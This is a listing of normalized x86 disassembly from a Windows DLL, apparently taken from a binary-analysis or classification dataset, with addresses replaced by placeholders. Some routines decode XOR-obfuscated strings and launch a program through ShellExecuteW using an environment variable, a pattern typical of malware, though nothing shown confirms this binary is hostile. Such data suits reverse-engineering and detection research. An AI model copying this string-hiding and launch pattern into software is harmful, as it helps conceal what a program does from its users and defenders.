lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x11
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0xf4 ]
push ecx
lea edi [ ebp - 0x120 ]
call sub_1001e5a0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0x124 ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0xf4 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_10037cf0
push esi
push ebx
call sub_1005c6a0
mov ebx 0x10
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0xa0 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] 0x0
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x124 ]
mov edx [ ebp - 0x124 ]
push edx
mov edx [ ebp - 0x11c ]
lea ecx [ ebp - 0x114 ]
push ecx
push edx
push eax
call sub_10072070
mov eax [ ebp - 0x120 ]
push eax
call sub_1000a86e
add esp 0x14
sub_10018590
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x14 ]
mov [ edx ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
mov ecx esi
pop esi
jmp sub_10009880
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push ecx
call sub_1000a86e
add esp 0x4
sub_10018600
push ebp
mov ebp esp
sub esp 0x1f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov ecx 0x3
mov [ ebp - 0x1f8 ] eax
xor eax eax
mov ebx edx
mov [ ebp - 0x1c ] cx
mov ecx [ r--data ]
mov [ ebp - 0x1c8 ] edi
mov [ ebp - 0x1d0 ] ebx
mov [ ebp - 0x1e8 ] eax
mov [ ebp - 0x1f4 ] eax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfff3
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x4
jb r-xdata
mov ecx [ edi + 0x1c ]
xor eax eax
mov [ ebp - 0x20 ] ax
mov esi [ ecx ]
lea edx [ ebp - 0x1e8 ]
push edx
mov edx [ ebp - 0x1c ]
push r--data
lea eax [ ebp - 0x28 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0x1e8 ]
jns r-xdata
lea edx [ ebp - 0x1c4 ]
mov [ ebp - 0x1c4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x10
call sub_1002f620
mov esi [ ebx ]
mov ecx edx
push ecx
lea edx [ ebp - 0x1c4 ]
push edx
push edi
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0x1c0 ]
mov eax 0xc8
jmp r-xdata
lea edx [ ebp - 0x1c0 ]
mov eax 0x61
call sub_1002f620
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebx + 0x4 ]
lea eax [ ebp - 0x1f0 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1f0 ] 0x0
call [ VarBstrFromUI4@IAT ]
lea edx [ ebp - 0x1ac ]
mov eax 0x2b
call sub_1002f620
mov esi [ ebp - 0x1f0 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0xf2
jmp r-xdata
call sub_1002f620
mov edx [ ebp - 0x1f0 ]
push edx
call [ SysFreeString@IAT ]
mov ecx [ ebx + 0x20 ]
lea eax [ ebp - 0x1ec ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1ec ] 0x0
call [ VarBstrFromUI4@IAT ]
lea edx [ ebp - 0x120 ]
mov eax 0x12c
call sub_1002f620
mov esi [ ebp - 0x1ec ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10007950
test eax eax
je r-xdata
mov ecx [ ebp - 0x1f0 ]
push ecx
call [ SysFreeString@IAT ]
jmp r-xdata
mov eax [ ebp - 0x1e8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x1c4 ] 0x0
mov edx [ ebp - 0x1ec ]
push edx
call [ SysFreeString@IAT ]
lea edx [ ebp - 0xd0 ]
mov eax 0xd
call sub_1002f620
mov esi [ ebx + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0x1c4 ]
push ecx
push edi
call sub_10007950
test eax eax
je r-xdata
mov ecx [ ebp - 0x1ec ]
push ecx
call [ SysFreeString@IAT ]
jmp r-xdata
mov eax [ ebp - 0x1c4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x134 ]
mov eax 0xc9
call sub_1002f620
mov esi [ ebx + 0xc ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x128
jmp r-xdata
mov ecx [ ebx + 0x10 ]
mov [ ebp - 0x1cc ] ecx
call sub_10068470
mov ebx eax
lea ecx [ ebx + ebx + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x1cc ]
mov esi eax
mov edi esi
call sub_10071e80
lea edx [ ebp - 0xbc ]
mov eax 0xd4
call sub_1002f620
mov edi [ ebp - 0x1c8 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x58
call sub_1002f620
test esi esi
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x103
call sub_1002f620
lea edx [ ebp - 0xe4 ]
mov eax 0xe
call sub_1002f620
mov ebx [ ebp - 0x1d0 ]
mov esi [ ebx + 0x14 ]
mov ecx edx
push ecx
lea edx [ ebp - 0x1c4 ]
push edx
push edi
call sub_10007950
test eax eax
je r-xdata
push esi
call [ LocalFree@IAT ]
lea edx [ ebp - 0x90 ]
mov eax 0x2e
call sub_1002f620
mov esi [ ebx + 0x18 ]
mov eax edx
push eax
lea ecx [ ebp - 0x1c4 ]
push ecx
push edi
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0xe2
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xcc
call sub_1002f620
mov esi [ ebx + 0x1c ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x108
call sub_1002f620
mov edx [ ebx + 0x2c ]
lea ecx [ ebp - 0x1d4 ]
push ecx
push 0x0
push 0x80000000
push edx
mov [ ebp - 0x1d4 ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0x1d4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x35
jmp r-xdata
lea edx [ ebp - 0x15c ]
mov eax 0x5f
call sub_1002f620
mov esi [ ebp - 0x1d4 ]
mov eax edx
push eax
lea ecx [ ebp - 0x1c4 ]
push ecx
push edi
call sub_10007950
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1d4 ] eax
mov edx [ ebp - 0x1d4 ]
mov edi [ SysFreeString@IAT ]
push edx
call edi
mov ecx [ ebx + 0x28 ]
lea eax [ ebp - 0x1dc ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1dc ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0x1dc ] 0x0
jne r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x12f
call sub_1002f620
lea edx [ ebp - 0x148 ]
mov eax 0x11b
call sub_1002f620
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1dc ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10007950
mov edx [ ebp - 0x1dc ]
push edx
call edi
mov ecx [ ebx + 0x24 ]
lea eax [ ebp - 0x1d8 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1d8 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1d8 ] 0x0
jne r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1dc ] eax
lea edx [ ebp - 0x18c ]
mov eax 0xd6
call sub_1002f620
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1d8 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10007950
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1d8 ] eax
mov edx [ ebp - 0x1d8 ]
push edx
call edi
cmp [ ebx + 0x38 ] 0x1
jne r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0x11c
call sub_1002f620
mov edx [ ebp - 0x1e8 ]
mov ecx [ ebp - 0x1c8 ]
call sub_10028cf0
test eax eax
je r-xdata
lea eax [ ebp - 0x1e4 ]
push eax
push 0x0
push 0x80000000
push 0x1
mov [ ebp - 0x1e4 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1e4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1f8 ]
mov eax [ eax ]
mov ecx [ eax ]
lea edx [ ebp - 0x1f4 ]
push edx
mov edx [ ebp - 0x1e8 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x1f4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xa5
call sub_1002f620
lea edx [ ebp - 0xf8 ]
mov eax 0x95
call sub_1002f620
mov eax [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1e4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0x1c4 ]
push edx
push eax
call sub_10007950
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1e4 ] eax
lea edx [ ebp - 0x74 ]
mov eax 0x7c
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x1f4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1e4 ]
push ecx
call edi
mov eax [ ebx + 0x44 ]
mov ecx [ ebx + 0x40 ]
lea edx [ ebp - 0x1e0 ]
push edx
push 0x0
push 0x80000000
push eax
push ecx
mov [ ebp - 0x1e0 ] 0x0
call [ VarBstrFromUI8@IAT ]
cmp [ ebp - 0x1e0 ] 0x0
jne r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x117
call sub_1002f620
lea edx [ ebp - 0x10c ]
mov eax 0x33
call sub_1002f620
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1e0 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10007950
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1e0 ] eax
mov edx [ ebp - 0x1e0 ]
push edx
call edi
mov ecx [ ebx + 0x48 ]
lea eax [ ebp - 0x1d0 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1d0 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1d0 ] 0x0
jne r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x34
call sub_1002f620
lea edx [ ebp - 0x9c ]
mov eax 0xb1
call sub_1002f620
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1d0 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10007950
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1d0 ] eax
mov edx [ ebp - 0x1d0 ]
push edx
call edi
mov ecx [ ebx + 0x4c ]
lea eax [ ebp - 0x1cc ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1cc ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1cc ] 0x0
jne r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0xda
call sub_1002f620
lea edx [ ebp - 0x174 ]
mov eax 0x47
call sub_1002f620
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1cc ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10007950
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1cc ] eax
mov edx [ ebp - 0x1cc ]
push edx
call edi
lea edx [ ebp - 0x74 ]
mov eax 0x3
call sub_1002f620
sub_10018dc0
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_10018e00
push ebp
mov ebp esp
sub esp 0x440
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor eax eax
push esi
lea ecx [ ecx ]
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0xffd5
and esi 0xff
mov [ ebp + eax * 2 - 0x30 ] si
inc eax
cmp eax 0x11
jb r-xdata
push edx
lea ecx [ ebp - 0x30 ]
xor eax eax
push ecx
mov ecx 0x104
lea ebx [ ebp - 0x238 ]
mov [ ebp - 0xe ] ax
call sub_1006d3c0
mov ecx [ r--data ]
add esp 0x8
pop esi
xor eax eax
pop ebx
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff9c
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x3
jb r-xdata
push 0x104
lea ecx [ ebp - 0x440 ]
push ecx
lea edx [ ebp - 0xc ]
xor eax eax
push edx
mov [ ebp - 0x6 ] ax
call [ GetEnvironmentVariableW@IAT ]
push 0x0
push 0x0
lea eax [ ebp - 0x238 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
push 0x0
push 0x0
call [ ShellExecuteW@IAT ]
mov ecx [ ebp - 0x4 ]
xor edx edx
cmp eax 0x20
setg dl
xor ecx ebp
mov eax edx
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10018ee0
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ r--data ]
movsx ecx [ eax ]
xor ecx 0xffc4
and ecx 0xff
lea eax [ ebp - 0x210 ]
push eax
xor edx edx
mov [ ebp - 0x210 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x20e ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x20c ]
call sub_1005bf30
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x20c ]
push ecx
lea ecx [ esi + 0x94 ]
call sub_10034100
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10018fa0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp + 0xc ]
push esi
cmp eax [ ecx + 0x4 ]
jne r-xdata
xor eax eax
pop esi
pop ebp
retn
mov ecx [ ecx ]
mov esi [ edx ]
cmp eax 0x4
jb r-xdata
test eax eax
je r-xdata
jmp r-xdata
mov eax 0x1
pop esi
pop ebp
retn
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
mov edx [ esi ]
cmp edx [ ecx ]
jne r-xdata
cmp eax 0x1
jbe r-xdata
sub eax 0x4
add ecx 0x4
add esi 0x4
cmp eax 0x4
jae r-xdata
mov dl [ ecx + 0x1 ]
cmp dl [ esi + 0x1 ]
jne r-xdata
cmp eax 0x2
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
sub_10019010
push ebp
mov ebp esp
mov eax edx
push esi
lea esi [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
push eax
push edx
call sub_10034100
pop esi
pop ebp
retn 0x4
sub_1001903e
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov ecx [ edx ]
and esi 0x1f
shl esi 0x6
add ecx esi
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_100190f9
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x8
movzx eax [ esi ]
push edi
push 0x0
push eax
call sub_10032181
movzx eax ax
add esp 0xc
push eax
lea ecx [ ebp + 0x10 ]
call sub_100650d7
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop edi
pop esi
sub_10019146
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_100637b6
dec [ ebp + 0x1c ]
jne r-xdata
sub_10019180
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x1
jl r-xdata
cmp eax 0xb
je r-xdata
cmp eax 0x8
jle r-xdata
mov eax 0x1
pop ebp
retn
cmp eax 0xe
jl r-xdata
cmp eax 0x7f
jl r-xdata
cmp eax 0x1f
jle r-xdata
cmp eax 0xfdd0
jl r-xdata
cmp eax 0x9f
jle r-xdata
and eax 0xffff
cmp eax 0xfffe
je r-xdata
cmp eax 0xfdef
jle r-xdata
cmp eax 0xffff
je r-xdata
xor eax eax
pop ebp
retn
sub_100191d7
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004b1ed
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1001927f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_10002c6e
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x80000000
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
mov ecx eax
or ecx edx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_1000fdf6
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_1005b670
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp edx esi
jb r-xdata
jb r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
mov [ eax ] 0x1
neg eax
adc edx 0x0
neg edx
ja r-xdata
cmp eax 0xffffffff
ja r-xdata
or eax 0xffffffff
mov edx 0x7fffffff
jmp r-xdata
xor eax eax
mov edx esi
jmp r-xdata
test eax eax
je r-xdata
sub_10019342
push 0x18
push r--data
call sub_1007fad0
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_10002fb1
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_1002f3c9
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100194d2
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_1007fb15
retn
push 0x40
push 0x20
call sub_100579de
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_1005fd8b
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_1002f3c9
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10019414
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_100194e0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
push edx
call sub_100582f0
mov esi eax
add esp 0xc
cmp esi 0xffffffff
jne r-xdata
pop esi
pop ebp
retn 0x10
call sub_1005b670
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov eax esi
sub_10019520
mov edx [ edi ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push ebx
lea ebx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_10034100
mov ecx [ edi + 0x4 ]
mov [ esi + 0x1c ] ecx
mov edx [ edi + 0x8 ]
mov [ esi + 0x20 ] edx
mov eax esi
pop ebx
retn
sub_10019570
